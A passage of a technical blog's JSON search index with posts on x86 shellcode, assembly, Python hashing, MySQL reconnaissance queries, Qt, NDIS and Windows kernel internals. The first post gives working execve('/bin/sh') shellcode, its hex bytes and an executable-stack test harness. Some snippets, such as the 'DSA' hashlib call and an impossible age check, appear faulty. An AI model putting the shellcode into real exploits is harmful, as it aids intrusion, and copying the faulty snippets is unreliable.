+ 7], al ; Null-terminate &#x27;/bin/sh&#x27; using the low byte of eaxlea ebx, [esi] ; Load the address of &#x27;/bin/sh&#x27; into ebxmov dword [esi + 8], ebxlea ecx, [esi + 8] ; Load the address of the argv array into ecxmov dword [esi + 12], eaxlea edx, [esi + 12] ; Load the address of the NULL terminator into edxmov al, 0x0b ; Set al to 0x0b, the system call number for execveint 0x80 ; Trigger the syscallcallShellcode:call shellcodedb &#x27;/bin/sh&#x27; After saving this code to a file named “shellx.asm,” you need to compile it using NASM to obtain the hexadecimal representation of the code. Use the following commands: 12nasm -f elf shellx.asmld -o shellx shellx.o -m elf_i386 This will generate a “shellx” file. However, it’s not executable yet. You’ll need to use the “objdump” command to extract the hexadecimal code. You can use a Bash script like this: 1234for i in $(objdump -d &quot;$1&quot; | tr &#x27;\\t&#x27; &#x27; &#x27; | tr &#x27; &#x27; &#x27;\\n&#x27; | egrep &#x27;^[0-9a-f]&#123;2&#125;$&#x27;); do echo -n &quot;\\x$i&quot;doneecho -e &quot;\\n&quot; To validate your assembly code, you’ll need a C program as follows: 1234567char code[] = &quot;\\xeb\\x18\\x5e\\x31\\xc0\\x88\\x46\\x07\\x8d\\x1e\\x89\\x5e\\x08\\x8d\\x4e\\x08\\x89\\x46\\x0c\\x8d\\x56\\x0c\\xb0\\x0b\\xcd\\x80\\xe8\\xe3\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68&quot;;int main(int argc, char **argv) &#123; int (*func)(); func = (int (*)()) code; (int)(*func)();&#125; Compile this code with the following command: 1gcc -g -o shellcodetest shellcodetest.c -m32 -z execstack This will produce an executable, “shellcodetest.” When you run it, you’ll get a shell with root privileges: 12345678root@kali:/home/kali/shellCode_train# ./shellcodetest# ls exit.asm hello shellcodetest shellx.asm exit.o hello.asm shellcodetest.c shellx.o getshellcode.sh hello.o shellx# whoami root#","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"shellcode","slug":"Penetration-Test/shellcode","permalink":"http://example.com/categories/Penetration-Test/shellcode/"}],"tags":[{"name":"shellcode","slug":"shellcode","permalink":"http://example.com/tags/shellcode/"}]},{"title":"Understanding Linux Permissions in One Image","slug":"LinuxPermission","date":"2011-03-04T16:31:25.000Z","updated":"2024-04-18T02:12:29.735Z","comments":true,"path":"2011/03/04/LinuxPermission/","link":"","permalink":"http://example.com/2011/03/04/LinuxPermission/","excerpt":"","text":"In Linux OS, when we use the command ‘ls -all’, we will see characters like r, w, x, as shown in the following image: When I explain the following image, you will understand all about the permissions: Let’s consider an example: 1drwxrwxr-x 8 qiluword qiluword 4096 Apr 7 01:46 binwalk The first ‘d’ means this is a directory. The first part ‘rwx’ indicates that the user who owns it has read&#x2F;write&#x2F;execute permissions, and the second part ‘rwx’ indicates that other users in the file’s group have read&#x2F;write&#x2F;execute permissions. The third part ‘r-x’ indicates that other users not in the file’s group have read&#x2F;-&#x2F;execute permissions. By the way, we often see commands like this: ‘chmod 777 .&#x2F;rootfs’. This means the first part, where the rwx bits are all 1, indicates that this directory has read, write, and execute permissions for all users.”","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"},{"name":"command","slug":"linux/command","permalink":"http://example.com/categories/linux/command/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"command","slug":"command","permalink":"http://example.com/tags/command/"}]},{"title":"How to compile asm to execute under Linux","slug":"nasmCompile","date":"2011-03-02T16:31:25.000Z","updated":"2023-10-17T15:39:39.176Z","comments":true,"path":"2011/03/02/nasmCompile/","link":"","permalink":"http://example.com/2011/03/02/nasmCompile/","excerpt":"","text":"Here is code snippet to show how to compile asm to execute under Linux: shellx.asm: 12345678910111213section .textglobal _start _start: mov edx,len mov ecx,msg mov ebx,1 mov eax,4 int 0x80 mov eax,1 int 0x80 section .datamsg db &#x27;Hello world&#x27;,0xa len equ $ - msg let’s start First step: 1vagrant@kali:~/Desktop/cdasm$ nasm -f elf64 shellx.asm Next step: 1vagrant@kali:~/Desktop/cdasm$ ld -s -o shellx shellx.o Execute : 1vagrant@kali:~/Desktop/cdasm$ ./shellx then output : 1Hello world","categories":[{"name":"Asm","slug":"Asm","permalink":"http://example.com/categories/Asm/"},{"name":"linux","slug":"Asm/linux","permalink":"http://example.com/categories/Asm/linux/"}],"tags":[{"name":"linux","slug":"linux","permalink":"http://example.com/tags/linux/"},{"name":"nasm","slug":"nasm","permalink":"http://example.com/tags/nasm/"}]},{"title":"Compilation of Python Code Snippets for Hashing","slug":"pythonHash","date":"2011-01-16T15:47:24.000Z","updated":"2023-10-17T16:06:28.632Z","comments":true,"path":"2011/01/16/pythonHash/","link":"","permalink":"http://example.com/2011/01/16/pythonHash/","excerpt":"","text":"Performing relevant hashing operations is an essential skill in penetration testing. Here is a compilation of code snippets for common hash implementations in Python. md5 : 123456import hashlibmystring = input(&#x27;Enter String to hash: &#x27;)# Assumes the default UTF-8hash_object = hashlib.md5(mystring.encode())print(hash_object.hexdigest()) sha1: 12345import hashlibhash_object = hashlib.sha1(b&#x27;Hello World&#x27;)hex_dig = hash_object.hexdigest()print(hex_dig) SHA256: hashlib1234hash_object = hashlib.sha256(b&#x27;Hello World&#x27;)hex_dig = hash_object.hexdigest()print(hex_dig) sha512: 12345import hashlibinput = &#x27;test&#x27;hash = hashlib.sha512( str( input ).encode(&quot;utf-8&quot;) ).hexdigest()print(hash) DSA: 12345import hashlibhash_object = hashlib.new(&#x27;DSA&#x27;)hash_object.update(b&#x27;Hello World&#x27;)print(hash_object.hexdigest())","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"hash","slug":"Penetration-Test/hash","permalink":"http://example.com/categories/Penetration-Test/hash/"}],"tags":[{"name":"hash","slug":"hash","permalink":"http://example.com/tags/hash/"}]},{"title":"About information_schema in MySQL","slug":"information-schema","date":"2010-10-15T16:47:16.000Z","updated":"2023-10-18T22:55:07.983Z","comments":true,"path":"2010/10/15/information-schema/","link":"","permalink":"http://example.com/2010/10/15/information-schema/","excerpt":"","text":"The “information_schema“ is a system database in MySQL that contains metadata information about databases, tables, columns, indexes, users, permissions, and more within the MySQL server. It serves as an interface for querying metadata information in MySQL. This information is stored in tabular form within tables in the “information_schema” database, and users can retrieve metadata information by using SQL statements to query these tables. Here are some common tables in the ‘information_schema’ database: SCHEMATA: Stores information about all databases, including database names, character sets, etc. TABLES: Stores information about all tables, including table names, table types, engines, etc. COLUMNS: Stores information about all columns, including column names, column data types, column constraints, etc. STATISTICS: Stores information about all indexes, including index names, index types, the table where the index is located, index columns, etc. USER_PRIVILEGES: Stores information about user privileges, including user accounts, permissions, etc. By querying the tables in the information_schema database, you can obtain information about various aspects of databases, tables, columns, indexes, users, and permissions. This is very helpful for database management and maintenance. Next, let’s take a look at an example of finding key information through the information_schema database: Query information about the current user:1SELECT current_user(); Query information about the user for the current session:1SELECT session_user(); Get the path of the database:1SELECT @@datadir; Get the installation path of MySQL:1select @@basedir; Retrieve information about the operating system version:1SELECT @@version_compile_os;","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"About information_schema","slug":"Penetration-Test/MySQL/About-information-schema","permalink":"http://example.com/categories/Penetration-Test/MySQL/About-information-schema/"}],"tags":[]},{"title":"In Qt, how to transmit custom data using QAction::setData","slug":"QtSetData","date":"2010-05-02T03:16:09.000Z","updated":"2023-10-24T01:54:43.350Z","comments":true,"path":"2010/05/01/QtSetData/","link":"","permalink":"http://example.com/2010/05/01/QtSetData/","excerpt":"","text":"Recently, in a project, there was a need to transmit custom data using QAction::setData. I’ve searched online for a lot of information, but it’s all a bit vague, and none of them hit the mark. Some even provide solutions that completely contradict Qt’s principles. Below is an example code I wrote: Custom data:Here, taking a custom class as an example, the code is as follows: 123456789101112131415161718192021//.h#ifndef QNEWITEM_H#define QNEWITEM_H#include &lt;QObject&gt;class QNewItem : public QObject&#123;public: QNewItem(QObject *parent = 0); ~QNewItem(); bool setUserInfo(QString&amp; strName,qint16&amp; nAge);private: QString m_strName; qint16 m_nAge;&#125;;#endif // QNEWITEM_H 123456789101112131415161718192021222324252627282930//.cpp#include &quot;qnewitem.h&quot;QNewItem::QNewItem(QObject *parent): QObject(parent)&#123;&#125;QNewItem::~QNewItem()&#123;&#125;bool QNewItem::setUserInfo( QString&amp; strName,qint16&amp; nAge )&#123; bool bRet = false; do &#123; if( strName.isEmpty() || nAge &gt;200 &amp;&amp; nAge&lt;0 ) break; m_strName = strName; m_nAge = nAge; bRet = true; &#125; while (false); return bRet;&#125; At the beginning of the calling CPP file, you must declare it like this: 123#include &quot;qnewitem.h&quot;Q_DECLARE_METATYPE(QNewItem*) There’s not much else to say; when you look at the code, you’ll understand everything. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#include &quot;qnewitem.h&quot;Q_DECLARE_METATYPE(QNewItem*)customDefineDemo::customDefineDemo(QWidget *parent, Qt::WFlags flags): QMainWindow(parent, flags)&#123; ui.setupUi(this); connect(ui.pushButton , SIGNAL(clicked()),this,SLOT(onBtnClick()));&#125;customDefineDemo::~customDefineDemo()&#123;&#125;void customDefineDemo::onBtnClick()&#123; QMenu* pMenu = new QMenu(); QNewItem* pNewItem = new QNewItem(); qint16 nAge = 34; QVariant qv; do &#123; QAction* pPortraitView = new QAction(tr(&quot;New&quot;), this); QAction* pAddGroup = new QAction(tr(&quot;Open&quot;), this); QAction* pDeleteGroup = new QAction(tr(&quot;Save&quot;), this); pNewItem-&gt;setUserInfo(tr(&quot;Eric&quot;),nAge); pPortraitView-&gt;setData( QVariant::fromValue(pNewItem) ) ; connect(pPortraitView,SIGNAL(triggered()),this,SLOT(triggeredMenuSendMsgContact())); pMenu-&gt;addAction(pPortraitView); pMenu-&gt;addAction(pAddGroup); pMenu-&gt;addAction(pDeleteGroup); pMenu-&gt;exec(QCursor::pos()); &#125; while (false); if( pMenu != nullptr ) &#123; delete pMenu; pMenu = nullptr; &#125;&#125;void customDefineDemo::triggeredMenuSendMsgContact()&#123; QAction* pSendMsg= NULL; QNewItem* pObj = NULL; do &#123; pSendMsg=qobject_cast&lt;QAction*&gt;(sender()); pObj = pSendMsg-&gt;data().value&lt;QNewItem*&gt;(); &#125; while (false); if( pObj != nullptr ) &#123; delete pObj; pObj = nullptr; &#125;&#125;","categories":[{"name":"C/C++","slug":"C-C","permalink":"http://example.com/categories/C-C/"},{"name":"Qt","slug":"C-C/Qt","permalink":"http://example.com/categories/C-C/Qt/"}],"tags":[{"name":"Qt","slug":"Qt","permalink":"http://example.com/tags/Qt/"}]},{"title":"The confusing floating point problem","slug":"floatData","date":"2010-03-15T02:44:22.000Z","updated":"2023-10-17T03:44:56.325Z","comments":true,"path":"2010/03/14/floatData/","link":"","permalink":"http://example.com/2010/03/14/floatData/","excerpt":"","text":"Recently, I encountered an issue with floating-point numbers. code: 1fld dword ptr ds:[esi+1E4] and 1esi+1E4 = 02FCE9D4 The following is its memory: 102FCE9D4 00 C0 2B 45 00 C0 2B 45 00 00 00 00 00 00 00 00 .?E.?E........ After execution this code: 1fld dword ptr ds:[esi+1E4] watches: 1ST0 = 2748.00000000000. I would like to know how ST0 equals 2748? In the end, it’s all about the representation of floating-point numbers. According to the IEEE standard, the first bit is the sign bit, the next 8 bits represent the exponent, and the remaining 23 bits are the mantissa. Considering that it’s little-endian storage, the value of the number 00 C0 2B 45 is 452BC000, which is: 10100 0101 0010 1011 1100 0000 0000 0000 The first bit is 0, indicating it’s a positive number.The next 8 bits, which is 10001010, 8A, in decimal, is 138. 138 - 127 &#x3D; 11, indicating the exponent is 11 bits.And the remaining 23 bits have the value: 1010 1011 1100 0000 0000 0000 The leading bit, with the omitted 1, has a value of: 11010 1011 1100 0000 0000 0000 Above 11 bits for the exponent indicate that the position of the decimal point is: 11010 1011 1100 . 0000 0000 0000 Converting to hexadecimal, it’s ABC.000. Converting to decimal, it’s 2748.00000000.","categories":[{"name":"Others","slug":"Others","permalink":"http://example.com/categories/Others/"},{"name":"float data","slug":"Others/float-data","permalink":"http://example.com/categories/Others/float-data/"}],"tags":[{"name":"asm","slug":"asm","permalink":"http://example.com/tags/asm/"},{"name":"float","slug":"float","permalink":"http://example.com/tags/float/"},{"name":"binary","slug":"binary","permalink":"http://example.com/tags/binary/"}]},{"title":"Example program for code decompilation","slug":"codedecompilation","date":"2009-11-05T03:36:35.000Z","updated":"2023-10-17T03:45:59.598Z","comments":true,"path":"2009/11/04/codedecompilation/","link":"","permalink":"http://example.com/2009/11/04/codedecompilation/","excerpt":"","text":"Some time ago, a friend asked me to help reverse engineer something, extract its code, save it as an assembly file, and compile and run it in VC (Visual C++). asm file : 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364 .686p .model flat,c option casemap : none extern sprintf:proc extern strcat:proc .data ___security_cookie dd 0BB40E64Eh a02x_0 db &quot;%02X&quot; .code public sub_40B444 sub_40B444 proc near ; CODE XREF: sub_40CCEA+A4p;Source = byte ptr -14h;var_4 = dword ptr -4;arg_0 = dword ptr 8;arg_4 = dword ptr 0Ch;arg_8 = dword ptr 10h push ebp mov ebp, esp sub esp, 14h mov eax, dword ptr ___security_cookie ; &quot;N鍬? xor eax, ebp mov [ebp-4], eax push ebx mov ebx, [ebp+8] push esi mov esi, [ebp+10h] push edi xor edi, edi cmp [ebp+0Ch], edi mov byte ptr [esi], 0 jbe short loc_40B48Eloc_40B467: ; CODE XREF: sub_40B444+48j movzx eax, byte ptr [ebx+edi] push eax lea eax, [ebp-14h] push offset a02x_0 ; &quot;%02X&quot; push eax ; Dest call sprintf lea eax, [ebp-14h] push eax ; Source push esi ; Dest call strcat add esp, 14h inc edi cmp edi, [ebp+0Ch] jb short loc_40B467loc_40B48E: ; CODE XREF: sub_40B444+21j mov ecx, [ebp-4] pop edi pop esi xor ecx, ebp leave retnsub_40B444 endpend The sample code is as follows: 123456789101112131415161718192021222324#include &quot;stdafx.h&quot;#include &lt;Windows.h&gt;extern &quot;C&quot; &#123; char* sub_40B444(char*,int,char*);&#125;int _tmain(int argc, _TCHAR* argv[])&#123; char* pszBuf = new char[1024]; memset( pszBuf , 0 , 1024 ); strcpy_s( pszBuf , 1024 , &quot;des:&quot; ); sub_40B444( &quot;你总是说我在，这样孤单时候，才能想起与你联络&quot; , strlen(&quot;你总是说我在，这样孤单时候，才能想起与你联络&quot;) , pszBuf ); printf_s( &quot;format string : %s\\n&quot; , &quot;你总是说我在，这样孤单时候，才能想起与你联络&quot; ); printf_s( &quot;format string : %s\\n&quot; , pszBuf ); if( pszBuf != NULL ) &#123; delete[]pszBuf; pszBuf = NULL; &#125; return 0;&#125;","categories":[{"name":"Asm","slug":"Asm","permalink":"http://example.com/categories/Asm/"},{"name":"windows","slug":"Asm/windows","permalink":"http://example.com/categories/Asm/windows/"}],"tags":[{"name":"inline","slug":"inline","permalink":"http://example.com/tags/inline/"},{"name":"asm","slug":"asm","permalink":"http://example.com/tags/asm/"},{"name":"C/C++","slug":"C-C","permalink":"http://example.com/tags/C-C/"}]},{"title":"NDIS6 how to drop packets","slug":"ndis6DropPackage","date":"2009-07-15T02:29:18.000Z","updated":"2023-10-17T16:02:49.880Z","comments":true,"path":"2009/07/14/ndis6DropPackage/","link":"","permalink":"http://example.com/2009/07/14/ndis6DropPackage/","excerpt":"","text":"In ndis6 how to drop packets? in FilterSendNetBufferLists: 1234567891011121314FILTER_RELEASE_LOCK(&amp;pFilter-&gt;Lock, DispatchLevel);//DEBUGP(DL_TRACE, (&quot;&lt;===SendNetBufferList [CheckPacket] drop this packet. \\n&quot;)); CurrNbl = NetBufferLists;while (CurrNbl)&#123; NET_BUFFER_LIST_STATUS(CurrNbl) = NDIS_STATUS_MEDIA_DISCONNECTED ; CurrNbl = NET_BUFFER_LIST_NEXT_NBL(CurrNbl);&#125;NdisFSendNetBufferListsComplete(pFilter-&gt;FilterHandle,NetBufferLists,DispatchLevel ? NDIS_SEND_COMPLETE_FLAGS_DISPATCH_LEVEL : 0);break; in FilterReceiveNetBufferLists: 12345678910111213FILTER_RELEASE_LOCK(&amp;pFilter-&gt;Lock, DispatchLevel);if (NDIS_TEST_RECEIVE_CAN_PEND(ReceiveFlags))&#123; ReturnFlags = 0; if (NDIS_TEST_RECEIVE_AT_DISPATCH_LEVEL(ReceiveFlags)) &#123; NDIS_SET_RETURN_FLAG(ReturnFlags, NDIS_RETURN_FLAGS_DISPATCH_LEVEL); &#125; NdisFReturnNetBufferLists(pFilter-&gt;FilterHandle, NetBufferLists, ReturnFlags);&#125;break;","categories":[{"name":"Kernel","slug":"Kernel","permalink":"http://example.com/categories/Kernel/"},{"name":"windows","slug":"Kernel/windows","permalink":"http://example.com/categories/Kernel/windows/"},{"name":"ndis6","slug":"Kernel/windows/ndis6","permalink":"http://example.com/categories/Kernel/windows/ndis6/"}],"tags":[{"name":"kernel","slug":"kernel","permalink":"http://example.com/tags/kernel/"},{"name":"ndis6","slug":"ndis6","permalink":"http://example.com/tags/ndis6/"},{"name":"firewall","slug":"firewall","permalink":"http://example.com/tags/firewall/"}]},{"title":"In a VC (Visual C++) project, how to compile with an assembly language file","slug":"compileAssemblyFile","date":"2009-01-04T04:29:12.000Z","updated":"2023-10-17T03:46:12.284Z","comments":true,"path":"2009/01/03/compileAssemblyFile/","link":"","permalink":"http://example.com/2009/01/03/compileAssemblyFile/","excerpt":"","text":"It include four steps: Add the assembly language file to the project. In the Solution Explorer window, right-click the Visual C++ project, choose “Build Customizations…”, and a dialog box labeled “Visual C++ Build Customization Files” will pop up. Check the “masm” option and click OK. At this point, in the Configuration Property, you can see “Microsoft Macro Assembler.“ Right-click the assembly language file, select “Properties,” go to “Custom Build Step,” and then “General.” In the “Command Line“ field on the right, input: 1ml.exe /c /D&quot;X86&quot; /D&quot;DEBUG&quot; /Fo&quot;$(IntDir)/$(InputName).obj&quot; $(InputFileName) In the “Outputs“ field, input: 1$(IntDir)/$(InputName).obj Don’t forget to add the path to ml.exe to the environment variable “PATH.”","categories":[{"name":"Asm","slug":"Asm","permalink":"http://example.com/categories/Asm/"},{"name":"windows","slug":"Asm/windows","permalink":"http://example.com/categories/Asm/windows/"}],"tags":[{"name":"inline","slug":"inline","permalink":"http://example.com/tags/inline/"},{"name":"asm","slug":"asm","permalink":"http://example.com/tags/asm/"},{"name":"C/C++","slug":"C-C","permalink":"http://example.com/tags/C-C/"}]},{"title":"About nt!PsSystemDllBase (XP)","slug":"PsSystemDllBase","date":"2008-04-15T00:09:51.000Z","updated":"2023-10-23T15:45:06.185Z","comments":true,"path":"2008/04/14/PsSystemDllBase/","link":"","permalink":"http://example.com/2008/04/14/PsSystemDllBase/","excerpt":"","text":"Today, while reverse engineering a kernel function, I came across this line: mov eax, dword ptr [nt!PsSystemDllBase (8055b280)] So, I realized that it should be a global pointer, but whose is it? 1234567891011kd&gt; dd nt!PsSystemDllBase8055b280 7c920000 00000000 00000000 000000008055b290 00000000 00000000 8052897c 000000008055b2a0 00000000 00000000 81f36868 81f368688055b2b0 00000000 00000000 00000000 000000008055b2c0 00000001 f8af9d50 00000000 000400018055b2d0 00000000 8055b2d4 8055b2d4 000000008055b2e0 821b9ad0 00000001 00000000 000000008055b2f0 00000000 00000000 00000000 00000000 7c920000, isn’t this the address of ntdll.dll being loaded? For verification, 123456789kd&gt; dd 7c9200007c920000 00905a4d 00000003 00000004 0000ffff7c920010 000000b8 00000000 00000040 000000007c920020 00000000 00000000 00000000 000000007c920030 00000000 00000000 00000000 000000d07c920040 0eba1f0e cd09b400 4c01b821 685421cd7c920050 70207369 72676f72 63206d61 6f6e6e617c920060 65622074 6e757220 206e6920 20534f447c920070 65646f6d 0a0d0d2e 00000024 00000000 5a4d , this is PE file header, and next , 1kd&gt; da 7c920000 output : 17c920000 &quot;MZ.&quot; go on : 1kd&gt; !dh 7c920000 output this: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126kd&gt; !dh 7c920000File Type: DLLFILE HEADER VALUES14C machine (i386)4 number of sections4D00F2A7 time date stamp Thu Dec 09 23:15:51 20100 file pointer to symbol table0 number of symbolsE0 size of optional header210E characteristicsExecutableLine numbers strippedSymbols stripped32 bit word machineDLLOPTIONAL HEADER VALUES10B magic #7.10 linker version7D000 size of code15A00 size of initialized data0 size of uninitialized data12AFC address of entry point1000 base of code----- new -----7c920000 image base1000 section alignment200 file alignment3 subsystem (Windows CUI)5.01 operating system version5.01 image version4.10 subsystem version96000 size of image400 size of headers9A8E1 checksum00040000 size of stack reserve00001000 size of stack commit00100000 size of heap reserve00001000 size of heap commit0 DLL characteristics3400 [ 9A5E] address [size] of Export Directory0 [ 0] address [size] of Import Directory83000 [ F7E4] address [size] of Resource Directory0 [ 0] address [size] of Exception Directory0 [ 0] address [size] of Security Directory93000 [ 2EEC] address [size] of Base Relocation Directory7DED4 [ 38] address [size] of Debug Directory0 [ 0] address [size] of Description Directory0 [ 0] address [size] of Special Directory0 [ 0] address [size] of Thread Storage Directory512D0 [ 40] address [size] of Load Configuration Directory0 [ 0] address [size] of Bound Import Directory0 [ 0] address [size] of Import Address Table Directory0 [ 0] address [size] of Delay Import Directory0 [ 0] address [size] of COR20 Header Directory0 [ 0] address [size] of Reserved DirectorySECTION HEADER #1.text name7CF32 virtual size1000 virtual address7D000 size of raw data400 file pointer to raw data0 file pointer to relocation table0 file pointer to line numbers0 number of relocations0 number of line numbers60000020 flagsCode(no align specified)Execute ReadDebug Directories(2)Type Size Address PointerCan not read debug dirSECTION HEADER #2.data name4A20 virtual size7E000 virtual address3200 size of raw data7D400 file pointer to raw data0 file pointer to relocation table0 file pointer to line numbers0 number of relocations0 number of line numbersC0000040 flagsInitialized Data(no align specified)Read WriteSECTION HEADER #3.rsrc nameF7E4 virtual size83000 virtual addressF800 size of raw data80600 file pointer to raw data0 file pointer to relocation table0 file pointer to line numbers0 number of relocations0 number of line numbers40000040 flagsInitialized Data(no align specified)Read OnlySECTION HEADER #4.reloc name2EEC virtual size93000 virtual address3000 size of raw data8FE00 file pointer to raw data0 file pointer to relocation table0 file pointer to line numbers0 number of relocations0 number of line numbers42000040 flagsInitialized DataDiscardable(no align specified)Read Only Indeed, it’s NTDLL.DLL. This means: 123nt!PsSystemDllBase is the address where NTDLL.DLL is loaded into memory.","categories":[{"name":"Kernel","slug":"Kernel","permalink":"http://example.com/categories/Kernel/"}],"tags":[{"name":"windows xp","slug":"windows-xp","permalink":"http://example.com/tags/windows-xp/"},{"name":"kernel","slug":"kernel","permalink":"http://example.com/tags/kernel/"}]}],"categories":[{"name":"vulnerability","slug":"vulnerability","permalink":"http://example.com/categories/vulnerability/"},{"name":"Cockpit","slug":"vulnerability/Cockpit","permalink":"http://example.com/categories/vulnerability/Cockpit/"},{"name":"Angular from Beginner to Hero","slug":"Angular-from-Beginner-to-Hero","permalink":"http://example.com/categories/Angular-from-Beginner-to-Hero/"},{"name":"(1) Setting up the Local Environment and Workspace","slug":"Angular-from-Beginner-to-Hero/1-Setting-up-the-Local-Environment-and-Workspace","permalink":"http://example.com/categories/Angular-from-Beginner-to-Hero/1-Setting-up-the-Local-Environment-and-Workspace/"},{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"metasploitable2","slug":"Penetration-Test/metasploitable2","permalink":"http://example.com/categories/Penetration-Test/metasploitable2/"},{"name":"linux","slug":"Penetration-Test/metasploitable2/linux","permalink":"http://example.com/categories/Penetration-Test/metasploitable2/linux/"},{"name":"VSFTPD 2.3.4 exploit","slug":"Penetration-Test/metasploitable2/linux/VSFTPD-2-3-4-exploit","permalink":"http://example.com/categories/Penetration-Test/metasploitable2/linux/VSFTPD-2-3-4-exploit/"},{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"Unit Test","slug":"Go/Unit-Test","permalink":"http://example.com/categories/Go/Unit-Test/"},{"name":"nil","slug":"Go/nil","permalink":"http://example.com/categories/Go/nil/"},{"name":"panic() and recover()","slug":"Go/panic-and-recover","permalink":"http://example.com/categories/Go/panic-and-recover/"},{"name":"defer","slug":"Go/defer","permalink":"http://example.com/categories/Go/defer/"},{"name":"Closure and Anonymous Function","slug":"Go/Closure-and-Anonymous-Function","permalink":"http://example.com/categories/Go/Closure-and-Anonymous-Function/"},{"name":"go func()","slug":"Go/go-func","permalink":"http://example.com/categories/Go/go-func/"},{"name":"Practical Tools","slug":"Penetration-Test/Practical-Tools","permalink":"http://example.com/categories/Penetration-Test/Practical-Tools/"},{"name":"Socat","slug":"Penetration-Test/Practical-Tools/Socat","permalink":"http://example.com/categories/Penetration-Test/Practical-Tools/Socat/"},{"name":"Netcat","slug":"Penetration-Test/Practical-Tools/Netcat","permalink":"http://example.com/categories/Penetration-Test/Practical-Tools/Netcat/"},{"name":"MySQL","slug":"Penetration-Test/MySQL","permalink":"http://example.com/categories/Penetration-Test/MySQL/"},{"name":"SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"},{"name":"MySQL Stack-Based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/MySQL-Stack-Based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/MySQL-Stack-Based-SQL-Injection/"},{"name":"HTTP Header SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/HTTP-Header-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/HTTP-Header-SQL-Injection/"},{"name":"MySQL Error-Based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/MySQL-Error-Based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/MySQL-Error-Based-SQL-Injection/"},{"name":"DNS Log Blind SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/DNS-Log-Blind-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/DNS-Log-Blind-SQL-Injection/"},{"name":"Time-Based Blind SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Time-Based-Blind-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Time-Based-Blind-SQL-Injection/"},{"name":"Boolean Blind Sql Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Boolean-Blind-Sql-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Boolean-Blind-Sql-Injection/"},{"name":"Union Sql Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Union-Sql-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Union-Sql-Injection/"},{"name":"Search-Based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Search-Based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Search-Based-SQL-Injection/"},{"name":"Character-based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Character-based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Character-based-SQL-Injection/"},{"name":"Numeric-based SQL Injection","slug":"Penetration-Test/MySQL/SQL-Injection/Numeric-based-SQL-Injection","permalink":"http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/Numeric-based-SQL-Injection/"},{"name":"Bash","slug":"Bash","permalink":"http://example.com/categories/Bash/"},{"name":"Bash Scripting 09 - Functions","slug":"Bash/Bash-Scripting-09-Functions","permalink":"http://example.com/categories/Bash/Bash-Scripting-09-Functions/"},{"name":"Bash Scripting 08 - While Loops","slug":"Bash/Bash-Scripting-08-While-Loops","permalink":"http://example.com/categories/Bash/Bash-Scripting-08-While-Loops/"},{"name":"Bash Scripting 07 - For Loops","slug":"Bash/Bash-Scripting-07-For-Loops","permalink":"http://example.com/categories/Bash/Bash-Scripting-07-For-Loops/"},{"name":"Bash Scripting 06 - Boolean Logical Operations","slug":"Bash/Bash-Scripting-06-Boolean-Logical-Operations","permalink":"http://example.com/categories/Bash/Bash-Scripting-06-Boolean-Logical-Operations/"},{"name":"Bash Scripting 05 - If, Else, Elif Statements","slug":"Bash/Bash-Scripting-05-If-Else-Elif-Statements","permalink":"http://example.com/categories/Bash/Bash-Scripting-05-If-Else-Elif-Statements/"},{"name":"Bash Scripting 04 - Reading User Input","slug":"Bash/Bash-Scripting-04-Reading-User-Input","permalink":"http://example.com/categories/Bash/Bash-Scripting-04-Reading-User-Input/"},{"name":"Bash Scripting 03 - Arguments","slug":"Bash/Bash-Scripting-03-Arguments","permalink":"http://example.com/categories/Bash/Bash-Scripting-03-Arguments/"},{"name":"Bash Scripting 02 - Variables","slug":"Bash/Bash-Scripting-02-Variables","permalink":"http://example.com/categories/Bash/Bash-Scripting-02-Variables/"},{"name":"Bash Scripting 01 - Intro to Bash Scripting","slug":"Bash/Bash-Scripting-01-Intro-to-Bash-Scripting","permalink":"http://example.com/categories/Bash/Bash-Scripting-01-Intro-to-Bash-Scripting/"},{"name":"System Architecture","slug":"System-Architecture","permalink":"http://example.com/categories/System-Architecture/"},{"name":"Plugin 